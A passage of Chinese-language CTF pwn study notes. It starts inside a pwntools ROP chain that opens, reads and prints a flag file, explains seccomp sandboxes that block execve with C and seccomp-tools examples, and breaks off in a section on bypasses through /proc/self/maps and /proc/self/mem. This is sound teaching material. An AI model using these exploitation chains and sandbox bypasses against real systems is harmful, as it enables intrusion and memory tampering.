</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;pop ebx; pop esi; ret;&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span> <span class=c1># 平衡栈</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span>	<span class=c1># open arg1</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>			<span class=c1># open arg2</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>			<span class=c1># read arg1</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=n>buf_addr</span><span class=p>)</span>	<span class=c1># read arg2 and puts arg1</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>		<span class=c1># read arg3</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rop</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;./flag</span><span class=se>\x00</span><span class=s2>&#34;</span></span></span></code></pre></div></div><h2 id=沙箱绕过>沙箱绕过</h2><h3 id=seccomp>Seccomp</h3><p>Sandbox，限制 execve 导致不能使用 onegadget 和 system 调用，一般两种方式开启沙箱</p><blockquote><ol><li><code>PR_SET_SECCOMP</code>是 linux 内核提供的一种机制，限制进程可执行的系统调用，可通过<code>prctl()</code>系统调用设置（可以通过<code>PR_SET_SECCOMP</code>设置进程的 seccomp 过滤器或<code>PR_SET_NO_NEW_PRIVS</code>设置进程的<code>no_new_privs</code>标志</li><li>seccomp 过滤器通过 BPF(Berkeley Packet Filter)程序实现，可以过滤进程所发起的系统调用并限制；seccomp 过滤器只在进程启动时设置，一旦设置不可修改</li><li><code>PR_SET_NO_NEW_PRIVS</code>标志可禁止进程获取更高权限，防止进程提权</li></ol></blockquote><ul><li>采用 prctl 函数调用</li><li>使用 seccomp 库函数</li></ul><p>编写沙箱规则保存在<code>rule</code>文件中</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=n>arch</span>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>==</span> <span class=n>ARCH_X86_64</span> <span class=o>?</span> <span class=nl>next</span> <span class=p>:</span> <span class=n>kill</span>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=n>sys_number</span>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>&gt;=</span> <span class=mh>0x40000000</span> <span class=o>?</span> <span class=nl>kill</span> <span class=p>:</span> <span class=n>next</span>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>==</span> <span class=n>execve</span> <span class=o>?</span> <span class=nl>kill</span> <span class=p>:</span> <span class=n>allow</span>
</span></span><span class=line><span class=cl><span class=nl>allow</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>ALLOW</span>
</span></span><span class=line><span class=cl><span class=nl>kill</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>KILL</span></span></span></code></pre></div></div><p>通过<code>seccomp-tools</code>将规则转换为可被<code>PR_SET_SECCOMP</code>识别的规则</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ seccomp-tools asm rule -a amd64 -f raw <span class=p>|</span> hexdump
</span></span><span class=line><span class=cl>$ seccomp-tools asm rule -a amd64 -f raw <span class=p>|</span> seccomp-tools disasm -
</span></span><span class=line><span class=cl> line  CODE  JT   JF      <span class=nv>K</span>
</span></span><span class=line><span class=cl><span class=o>=================================</span>
</span></span><span class=line><span class=cl> 0000: 0x20 0x00 0x00 0x00000004  <span class=nv>A</span> <span class=o>=</span> arch
</span></span><span class=line><span class=cl> 0001: 0x15 0x00 0x04 0xc000003e  <span class=k>if</span> <span class=o>(</span>A !<span class=o>=</span> ARCH_X86_64<span class=o>)</span> goto <span class=m>0006</span>
</span></span><span class=line><span class=cl> 0002: 0x20 0x00 0x00 0x00000000  <span class=nv>A</span> <span class=o>=</span> sys_number
</span></span><span class=line><span class=cl> 0003: 0x35 0x02 0x00 0x40000000  <span class=k>if</span> <span class=o>(</span>A &gt;<span class=o>=</span> 0x40000000<span class=o>)</span> goto <span class=m>0006</span>
</span></span><span class=line><span class=cl> 0004: 0x15 0x01 0x00 0x0000003b  <span class=k>if</span> <span class=o>(</span><span class=nv>A</span> <span class=o>==</span> execve<span class=o>)</span> goto <span class=m>0006</span>
</span></span><span class=line><span class=cl> 0005: 0x06 0x00 0x00 0x7fff0000  <span class=k>return</span> ALLOW
</span></span><span class=line><span class=cl> 0006: 0x06 0x00 0x00 0x00000000  <span class=k>return</span> KILL</span></span></code></pre></div></div><p>将规则应用于 C 程序中</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/seccomp.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/prctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;linux/filter.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 定义过滤器规则 存放机器码
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>struct</span> <span class=n>sock_filter</span> <span class=n>filter</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00000004</span><span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span><span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0xc000003e</span><span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00000000</span><span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span><span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x40000000</span><span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span><span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0000003b</span><span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span><span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x7fff0000</span><span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span><span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00000000</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>sock_fprog</span> <span class=n>prog</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=p>.</span><span class=n>len</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>short</span><span class=p>)</span> <span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>filter</span><span class=p>)</span> <span class=o>/</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>filter</span><span class=p>[</span><span class=mi>0</span><span class=p>])),</span> <span class=c1>// 过滤器长度
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>.</span><span class=n>filter</span> <span class=o>=</span> <span class=n>filter</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 确保进程无法获取新的权限
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>prctl</span><span class=p>(</span><span class=n>PR_SET_NO_NEW_PRIVS</span><span class=p>,</span> <span class=n>SECCOMP_MODE_STRICT</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 设置seccomp过滤器
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nf>prctl</span><span class=p>(</span><span class=n>PR_SET_SECCOMP</span><span class=p>,</span> <span class=n>SECCOMP_MODE_FILTER</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>prog</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;[-] prctl error.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 执行系统调用 将会失败
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>args</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=s>&#34;-i&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nf>execve</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>args</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><strong>prctl</strong>——系统调用，控制和修改进程的行为和属性，决定系统调用</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/prctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>prctl</span><span class=p>(</span><span class=kt>int</span> <span class=n>option</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg2</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg3</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg4</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg5</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>IDA</strong>显示</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>prctl</span><span class=p>(</span><span class=mi>38</span><span class=p>,</span> <span class=mi>1LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// arg1: #define PR_SET_NO_NEW_PRIVS 38
</span></span></span><span class=line><span class=cl><span class=c1>// arg2: no_new_privs=1 无法使用execve() 继承到子进程
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nf>prctl</span><span class=p>(</span><span class=mi>22</span><span class=p>,</span> <span class=mi>2LL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// arg1: #define PR_SET_SECCOMP	22
</span></span></span><span class=line><span class=cl><span class=c1>// arg2: #define SECCOMP_MODE_FILTER 2 BPF过滤:对syscall的限制通过arg3的Berkeley Packet Filter相关结构体定义
</span></span></span></code></pre></div></div><p><strong>使用 Seccomp 创建 Seccomp</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// gcc test.c -o test -lseccomp
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;seccomp.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 创建过滤器上下文
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>scmp_filter_ctx</span> <span class=n>ctx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>ctx</span> <span class=o>=</span> <span class=nf>seccomp_init</span><span class=p>(</span><span class=n>SCMP_ACT_ALLOW</span><span class=p>);</span> <span class=c1>// 默认allow
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// 添加过滤规则
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>seccomp_arch_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ARCH_X86_64</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_KILL</span><span class=p>,</span> <span class=nf>SCMP_SYS</span><span class=p>(</span><span class=n>execve</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>seccomp_load</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 执行系统调用
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span> <span class=o>*</span><span class=n>args</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=s>&#34;-i&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nf>execve</span><span class=p>(</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>args</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><code>seccomp_arch_add</code>函数</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>scmp_filter_ctx</span> <span class=n>ctx</span><span class=p>,</span> <span class=kt>uint32_t</span> <span class=n>action</span><span class=p>,</span> <span class=kt>int</span> <span class=n>syscall</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>arg_cnt</span><span class=p>,</span> <span class=p>...);</span>
</span></span><span class=line><span class=cl><span class=c1>// ctx: 过滤器上下文，存储过滤规则
</span></span></span><span class=line><span class=cl><span class=c1>// action: 规则匹配时的操作:SCMP_ACT_ALLOW允许系统调用, SCMP_ACT_KILL杀死进程, SCMP_ACT_ERRNO返回错误码并允许系统调用
</span></span></span><span class=line><span class=cl><span class=c1>// syscall: 限制的系统调用号
</span></span></span><span class=line><span class=cl><span class=c1>// arg_cnt: 要匹配的参数数量
</span></span></span><span class=line><span class=cl><span class=c1>// ...: 指定要匹配的参数值, 每个参数一个scmp_arg_cmp结构体, 包含参数比较方法和比较值
</span></span></span></code></pre></div></div><p><code>scmp_arg_cmp</code>结构体</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>scmp_arg_cmp</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>arg</span><span class=p>;</span>   <span class=cm>/**&lt; argument number, starting at 0 要比较的参数序号*/</span>
</span></span><span class=line><span class=cl>    <span class=k>enum</span> <span class=n>scmp_compare</span> <span class=n>op</span><span class=p>;</span>   <span class=cm>/**&lt; the comparison op 比较方式 */</span>
</span></span><span class=line><span class=cl>    <span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>    	SCMP_CMP_NE: 不等于
</span></span></span><span class=line><span class=cl><span class=cm>    	SCMP_CMP_EQ: 等于
</span></span></span><span class=line><span class=cl><span class=cm>    	SCMP_CMP_LT: 小于
</span></span></span><span class=line><span class=cl><span class=cm>    	SCMP_CMP_LE: 小于等于
</span></span></span><span class=line><span class=cl><span class=cm>    	SCMP_CMP_GT: 大于
</span></span></span><span class=line><span class=cl><span class=cm>    	SCMP_CMP_GE: 大于等于
</span></span></span><span class=line><span class=cl><span class=cm>    	SCMP_CMP_MASKED_EQ: 按位与后等于
</span></span></span><span class=line><span class=cl><span class=cm>    **/</span>
</span></span><span class=line><span class=cl>    <span class=kt>scmp_datum_t</span> <span class=n>datum_a</span><span class=p>;</span>	<span class=c1>// 用来于参数比较的值
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>scmp_datum_t</span> <span class=n>datum_b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><p>如：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 规定 read 必须从标准输入读取不超过 BUF_SIZE 的内容到 buf 中
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#define BUF_SIZE 0x100
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=n>BUF_SIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=nf>SCMP_SYS</span><span class=p>(</span><span class=n>read</span><span class=p>),</span> <span class=mi>3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                 <span class=nf>SCMP_A0</span><span class=p>(</span><span class=n>SCMP_CMP_EQ</span><span class=p>,</span> <span class=nf>fileno</span><span class=p>(</span><span class=n>stdin</span><span class=p>)),</span>
</span></span><span class=line><span class=cl>                 <span class=nf>SCMP_A1</span><span class=p>(</span><span class=n>SCMP_CMP_EQ</span><span class=p>,</span> <span class=p>(</span><span class=kt>scmp_datum_t</span><span class=p>)</span> <span class=n>buf</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                 <span class=nf>SCMP_A2</span><span class=p>(</span><span class=n>SCMP_CMP_LE</span><span class=p>,</span> <span class=n>BUF_SIZE</span><span class=p>));</span></span></span></code></pre></div></div><p><strong>seccomp</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// IDA 中显示
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>v</span> <span class=o>=</span> <span class=nf>seccomp_init</span><span class=p>(</span><span class=mi>111LL</span><span class=p>);</span> <span class=c1>// 初始化，参数表示用于过滤的操作模式
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>seccomp_rule_add</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>59LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span> <span class=c1>// 禁用59系统调用号execve
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>seccomp_load</span><span class=p>(</span><span class=n>v</span><span class=p>);</span> <span class=c1>// 加载过滤器
</span></span></span></code></pre></div></div><p><strong>绕过</strong>：查看 ret2syscall 中 orw bypass</p><h3 id=proc-泄露>/proc 泄露</h3><ul><li>保护全开，提供<code>open</code>，<code>read</code>，<code>write</code>，<code>lseek</code>函数</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nl>open</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>O_RDONLY</span>        <span class=mo>00000000</span>
</span></span><span class=line><span class=cl><span class=n>O_WRONLY</span>        <span class=mo>00000001</span>
</span></span><span class=line><span class=cl><span class=n>O_RDWR</span>          <span class=mo>00000002</span></span></span></code></pre></div></div><ul><li><strong>lseek</strong>函数：在文件中移动文件指针的位置</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>off_t</span> <span class=nf>lseek</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>off_t</span> <span class=n>offset</span><span class=p>,</span> <span class=kt>int</span> <span class=n>whence</span><span class=p>);</span><span class=c1>// 返回文件指针偏移值 或 -1
</span></span></span><span class=line><span class=cl><span class=c1>// fd: 文件描述符   offset: 相对于whence的偏移量
</span></span></span><span class=line><span class=cl><span class=c1>// whence: 文件指针基准位置【SEEK_SET 0 开头, SEEK_CUR 1 当前, SEEK_END 2 结尾】
</span></span></span></code></pre></div></div><p><strong>/proc 文件系统</strong></p><ol><li>Linux 内核提供的一种<strong>伪</strong>文件系统，运行时可访问、设置内核内部数据结构，只存在内存中，不占外存空间</li><li><code>/proc/self/maps</code>: 得到当前进程内存映射关系，等价于 pwndbg 中的<code>vmmap</code>，open 只可读，<strong>可获取内存代码段基址</strong></li></ol><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>vmmap</span>
</span></span><span class=line><span class=cl><span class=nl>LEGEND</span><span class=p>:</span> <span class=n>STACK</span> <span class=o>|</span> <span class=n>HEAP</span> <span class=o>|</span> <span class=n>CODE</span> <span class=o>|</span> <span class=n>DATA</span> <span class=o>|</span> <span class=n>RWX</span> <span class=o>|</span> <span class=n>RODATA</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x555555554000</span>     <span class=mh>0x555555555000</span> <span class=n>r</span><span class=o>--</span><span class=n>p</span>     <span class=mi>1000</span> <span class=mi>0</span>      <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>zhou</span><span class=o>/</span><span class=n>pwn</span>
</span></span><span class=line><span class=cl><span class=c1>// 0x555555554000 即为文件基址
</span></span></span></code></pre></div></div><ul><li><code>/proc/self/mem</code>: 进程内存内容，open 可读可写，修改该文件等效于直接修改当前进程内存</li></ul><img src=/img/pwn_note.zh-cn.assets/172844670575243.png alt=图片无法加载><p><strong>绕过利用</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// open时文件包含flag将会报错
